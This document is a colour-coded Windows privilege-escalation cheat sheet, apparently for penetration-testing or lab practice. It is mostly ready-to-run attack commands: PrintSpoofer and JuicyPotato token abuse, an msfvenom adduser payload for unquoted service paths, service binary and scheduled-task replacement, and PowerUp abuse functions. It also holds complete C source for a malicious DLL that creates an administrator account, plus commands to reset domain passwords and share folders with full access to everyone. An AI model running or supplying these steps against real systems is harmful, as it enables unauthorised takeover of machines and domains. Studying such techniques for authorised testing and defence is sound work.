\033[0;34m##################################################################\033[0m
\033[1;35m=== SeImpersonatePrivilege ===\033[0m
\033[0;37mIf you are within a CMD use exploit.exe...
If you are within a Powershell use .\\exploit.exe...\033[0m

\033[4;31m- Exploit with 'PrintSpoofer' -\033[0m

\033[0;31m- helpmenu -\033[0m
PrintSpoofer.exe -h
\033[0;37m...\033[0m

\033[0;31m- Spawn System Process (Elevated Privileges) -\033[0m
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -i -c cmd

\033[4;31m- Exploit with 'juicy-potato' -\033[0m

\033[0;31m- helpmenu -\033[0m
juicypotato.exe
\033[0;37m...\033[0m

\033[0;31m- Create process with token (don't include clsid: in '-c') -\033[0m
juicypotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {<clsid:4991d34b-80a1-4291-83b6-3328366b9097>}
\033[0;34m##################################################################\033[0m
\033[1;35m=== Unquoted Service Path ===\033[0m
\033[0;31m- Find binaries with spaces in the binary path -\033[0m
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

Get-CimInstance -ClassName win32_service | Select Name,State,PathName

\033[0;31m- Check permissionsmask with icacls -\033[0m
icacls "<C:\\Program Files\\<...>>"

\033[3;31m- [!] if you find binaries with 'unquoted service paths' -\033[0m
\033[1;31m[1] Copy the path for reference\033[0m
\033[0;31me.g: \033[0mC:\\Users\\user\\\033[5;31mOpenVPN\033[0m Connect\\ovpnhelper_service.exe

\033[1;31m[2] Generate a binary with msfvenom (make sure the name matches the cut pathname) \033[0m
msfvenom -p windows/adduser USER=unquoted PASS=Password123! -f exe -o \033[5;31mOpenVPN.exe\033[0m

\033[1;31m[3] Copy the msfvenom binary into a folder below the actual binary\033[0m
\033[0;31me.g: \033[0mC:\\Users\\user\\<PLACE_BINARY_HERE>\\OpenVPN Connect\\ovpnhelper_service.exe

\033[1;31m[4] Stop/Start/Restart the service or machine (CMD/Powershell)\033[0m
net stop <service>

net start <service>

Start-Service <service>

Stop-Service <service>

Restart-Service <service>

\033[0;31m- If StartMode = Auto (restart computer) -\033[0m
shutdown /r /t 0

\033[1;35m=== Unquoted Service Path With Script (PowerUp.ps1) ===\033[0m
\033[1;31m[1] Start powershell with ExecutionPolicy Bypass:\033[0m
powershell -ep bypass

\033[1;31m[2] Import the script (Powershell):\033[0m
. .\PowerUp.ps1

\033[1;31m[3] Use the functions (Powershell):\033[0m
\033[0;31m- List Unquoted Service paths -\033[0m
Get-UnquotedService

\033[0;31m- Use the AbuseFunction to automate the process -\033[0m
Write-ServiceBinary -Name '<ServiceName>' -Path "<C:\\path\\to\\Unquoted.exe>"

\033[1;31m[4] Restart/Start/Stop the service (CMD/Powershell):\033[0m
net stop <service>

net start <service>

Start-Service <service>

Stop-Service <service>

Start-Service <service>

Stop-Service <service>

Restart-Service <service>

\033[0;34m##################################################################\033[0m
\033[1;35m=== Service Binary Hijacking ===\033[0m
\033[1;31m[1] Discover running services (Powershell):\033[0m
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

\033[1;31m[2] Get permissionsmask of binary (CMD/Powershell):\033[0m
icacls "C:\\path\\to\\binary.exe"

\033[1;31m[3] Replace the binary with your own executable (CMD/Powershell):\033[0m
move C:\\path\\to\\your_executable.exe C:\\path\\to\\executable_to_be_replaced.exe

\033[1;31m[4] List StartMode for the service (Powershell):\033[0m
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<service>'}

\033[1;31m[5] Attempt to stop/start/restart service OR system... depending on StartMode & Permissions (CMD/Powershell):\033[0m
net stop <service>

net start <service>

Start-Service <service>

Stop-Service <service>

Restart-Service <service>

\033[0;31m- If StartMode = Auto (restart computer) -\033[0m
shutdown /r /t 0

\033[1;35m=== Service Binary Hijacking With Script (PowerUp.ps1) ===\033[0m
\033[1;31m[1] Start powershell with ExecutionPolicy Bypass:\033[0m
powershell -ep bypass

\033[1;31m[2] Import the script (Powershell):\033[0m
. .\PowerUp.ps1

\033[1;31m[3.0] Use its functions (display modifiable services) (Powershell):\033[0m
Get-ModifiableServiceFile

\033[1;31m[3.1] Use its functions, attempt to replace binary and restart service (not reliable) (Powershell):\033[0m
Install-ServiceBinary -Name '<service>'

\033[1;31m[3.2] If the function returns errors, examine the behaviour of the script:\033[0m
\033[0;31m- Attempt to automate the process of replacing file and restarting service -\033[0m
Install-ServiceBinary -Name '<service>'

\033[0;31m- Possible errors that could occur (example) -\033[0m
\033[0;37mIf the default path of the script is not recognized... You might have to manually fix the path...\033[0m
$ModifiableFiles = echo 'C:\\<xampp>\\<mysql>\\<bin>\\<mysqld.exe> | Get-ModifiablePath -Literal
$ModifiableFiles

\033[0;34m##################################################################\033[0m
\033[1;35m=== Service DLL Hijacking ===\033[0m
\033[0;31m- Hijack the DLL search order -\033[0m
\033[1;31mThe search order varies but the standard looks like the following:\033[0m
\033[0;37m1. The directroy from which the application loaded.
2. The system directory
3. The 16-bit system directory
4. The windows directory
5. The current directory
6. The directories that are listed in the PATH envronment variable.\033[0m

\033[1;31m[1] Discover running services:\033[0m
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

\033[1;31m[2] Check permissionsmask for service/binary:\033[0m
icacls <C:\\path\\to\\binary/service>

\033[1;31m[3] Use procmon and filter for the service/binary to discover vulnerable search path (requires administrator privs):\033[0m
\033[0;37mThis process requires administrative privileges so the standard procedure would be to copy the
service to your own local machine and install it locally and use Process Monitor (procmon) with administrative
privileges to list all DLL activity.\033[0m

\033[1;31m[4] Create and compile malicious .dll file and transfer it to the vulnerable search path:\033[0m
\033[0;31m- Code example of malicious .dll file (create a user and add the user to the administrators group) -\033[0m
---------------------------------------------------------------------------\033[0;37m
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,             // handle to DLL module
DWORD ul_reason_for_call,   // Reason for calling function
LPVOID lpReserved)          // Reserved

{
    switch(ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:        // A process is loading the DLL
            int i;
            i = system ("net user john password123! /add");
            i = system ("net localgroup administrators john /add");
            break;
        case DLL_THREAD_ATTACH:         // A process is creating a new thread
            break;
        case DLL_THREAD_DEATTACH:       // A thread exits normally
            break;
        case DLL_PROCESS_DETACH:        // A process unloads the DLL
            break;
    }
    return TRUE;
}
\033[0m--------------------------------------------------------------------------

\033[0;31m- Compile the code to a .dll file where the name matches the actual .dll file to be replaced (Linux) -\033[0m
x86_64-w64-mingw32-gcc <myDLL.cpp> --shared -o <myDLL.dll>

\033[0;34m##################################################################\033[0m
\033[1;35m=== Abusing Scheduled Tasks ===\033[0m
\033[1;31m[1] List scheduled tasks:\033[0m
\033[0;31m- List information about scheduled tasks (prints out a lot of information) (CMD/Powershell) -\033[0m
schtasks /query /fo LIST /v

\033[0;31m- If you know the TaskName you can filter for specific output (CMD/Powershell) -\033[0m
schtasks /query /TN "\\path\\task\\name" /fo LIST /v

\033[0;31m- List scheduled tasks within C:\\Users\\* (Powershell) -\033[0m
Get-ScheduledTask | Where-Object { $_Actions.Execute -like "<C:\\Users\\*>" }

\033[0;31m- List information about specific scheduled task (Powershell) -\033[0m
Get-ScheduledTask | Where-Object { $_.TaskName -like "<scheduled_task>" } | Format-List

\033[1;31m[2] List permissionsmask of scheduled-task-target:\033[0m
icacls "C:\\path\\to\\scheduled_task"

\033[1;31m[3] Replace script/executable with malicious file:\033[0m
\033[0;31m- Create a backup before replacing it -\033[0m
move "C:\\path\\to\\backup_script" <backup_script.bak>

\033[0;31m- Replace with malicious file -\033[0m
move <malicious_file> "C:\\path\\to\\backup_script"

\033[1;31m[4] Wait for scheduled task to execute...\033[0m

\033[0;34m##################################################################\033[0m
\033[1;35m=== Using Exploits ===\033[0m

\033[0;34m##################################################################\033[0m
\033[1;35m=== Changes in domain (CMD/Powershell) ===\033[0m
\033[0;31m- unlock domain user account -\033[0m
net user <user> /ACTIVE:yes/domain

\033[0;31m- change domain user password -\033[0m
net user <user> "<new_password>" /domain

\033[0;31m- share folder with FULL access to everyone -\033[0m
net share <share_name> c:\<folder> /GRANT:Everyone,FULL

\033[0;34m##################################################################\033[0m
\033[1;35m=== User Impersonation (requires GUI) (CMD) ===\033[0m
\033[0;31m- Start cmd as another user -\033[0m
runas /user:<user> cmd

\033[0;34m##################################################################\033[0m
\n
